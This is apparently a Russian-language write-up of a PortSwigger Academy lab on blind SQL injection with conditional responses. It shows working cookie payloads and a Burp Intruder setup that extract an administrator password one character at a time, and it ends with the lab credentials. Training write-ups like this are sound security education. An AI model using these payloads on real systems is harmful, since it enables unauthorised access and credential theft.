Откроем лабораторную работу
При обновлении страницы появлется надпись `Welcome back!`, что является индикатором для возможной слепой SQL-инъекции
Перейдем в `Proxy` -> `HTTP history` и найдем необходимый запрос на коревую страницу и отправим данный запрос в `Repeater`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/7.%20Blind%20SQL%20injection%20with%20conditional%20responses/pics%20for%20walktrough/1.png)
Далее проверим наличие SQL-инъекции добавивив в Cookie пэйлоад
```
Cookie: TrackingId=89ohA4sDLYal579L' and '1'='1
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/7.%20Blind%20SQL%20injection%20with%20conditional%20responses/pics%20for%20walktrough/2.png)
Получаем 200 ответ, это означать, что слепая инъекция существует, и ее тригером является фраза - `Welcome back!`
Далее модифицируем наш SQL запрос, чтобы мы могли быть уверены, что УЗ `administrator` (которая дана нам по заданию) существует и у нее есть пароль
```
Cookie: TrackingId=89ohA4sDLYal579L' and (SELECT 'a' from users WHERE username='administrator' AND LENGTH(password)>1)='a;
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/7.%20Blind%20SQL%20injection%20with%20conditional%20responses/pics%20for%20walktrough/3.png)
Далее отправим данный запрос в `Intruder`, чтобы узнать количество символов в пароле
```
Cookie: TrackingId=89ohA4sDLYal579L' and (SELECT 'a' from users WHERE username='administrator' AND LENGTH(password)>§1§)='a;
```

В разделе `Payload` выбираем `Payload type: Number` и выберем `Number range от 1 до 25`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/7.%20Blind%20SQL%20injection%20with%20conditional%20responses/pics%20for%20walktrough/4.png)
И в разделе `Settings` в поле `Grep - Match` выберем фразу, которая будет индикатором успешности SQL-инъекции. В нашем случае, это фраза - `Welcome back!`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/7.%20Blind%20SQL%20injection%20with%20conditional%20responses/pics%20for%20walktrough/5.png)
Запустим атаку, и узнаем, что пароль УЗ `administrator` > 19 символов, а значит 20 символов.
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/7.%20Blind%20SQL%20injection%20with%20conditional%20responses/pics%20for%20walktrough/6.png)
Далее методом `SUBSTRING(password,1,1)`. Данная строка означает, что нужно проверить вхождение в строку password символов с позиции 1, и нужно взять 1 символ, иначе говоря, `SUBSTRING(string, start, length)`
```
Cookie: TrackingId=89ohA4sDLYal579L' and (SELECT SUBSTRING(password,1,1) from users WHERE username='administrator')='§a§;
```
И список символов, которые мы проверяем - `a-z`, `0-9`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/7.%20Blind%20SQL%20injection%20with%20conditional%20responses/pics%20for%20walktrough/7.png)
После запуска видим, что первый символ пароля - `n`
И далее последовательно выполняем атаку по каждой отдельной позиции в пароле 
```
Cookie: TrackingId=89ohA4sDLYal579L' and (SELECT SUBSTRING(password,1,1) from users WHERE username='administrator')='§a§;
Cookie: TrackingId=89ohA4sDLYal579L' and (SELECT SUBSTRING(password,2,1) from users WHERE username='administrator')='§a§;
Cookie: TrackingId=89ohA4sDLYal579L' and (SELECT SUBSTRING(password,3,1) from users WHERE username='administrator')='§a§;
Cookie: TrackingId=89ohA4sDLYal579L' and (SELECT SUBSTRING(password,4,1) from users WHERE username='administrator')='§a§;
...
Cookie: TrackingId=89ohA4sDLYal579L' and (SELECT SUBSTRING(password,20,1) from users WHERE username='administrator')='§a§;
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/7.%20Blind%20SQL%20injection%20with%20conditional%20responses/pics%20for%20walktrough/8.png)
Чтобы сократить данный райтап, не стану мучать скрином каждого символа. В итоге у меня получились следующие креды `administrator:ny8pt4hwe6njv329utp7`, и успешно аутентифицуемся под этой записью и получим уведомление об успешном выполнении лабораторной работы
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/7.%20Blind%20SQL%20injection%20with%20conditional%20responses/pics%20for%20walktrough/10.png)
